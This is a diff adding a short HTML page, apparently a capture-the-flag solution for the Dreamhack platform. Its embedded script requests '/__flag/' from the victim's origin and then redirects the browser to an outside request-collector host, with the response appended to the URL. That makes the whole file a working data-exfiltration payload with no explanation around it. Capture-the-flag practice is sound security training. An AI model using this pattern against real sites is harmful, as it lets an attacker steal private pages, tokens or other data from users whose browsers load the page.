@@ -1,0 +1,17 @@
+<html>
+<head></head>
+<body>
+<script>
+var xmlHttp = new XMLHttpRequest();
+xmlHttp.onreadystatechange = function()
+{
+    if(xmlHttp.readyState == 4)
+    {
+        location.href = "https://yomgeei.request.dreamhack.games?data=1234&d=" + xmlHttp.responseText;
+    }
+}
+xmlHttp.open("get", "/__flag/"); 
+xmlHttp.send();
+</script>
+</body>
+</html>
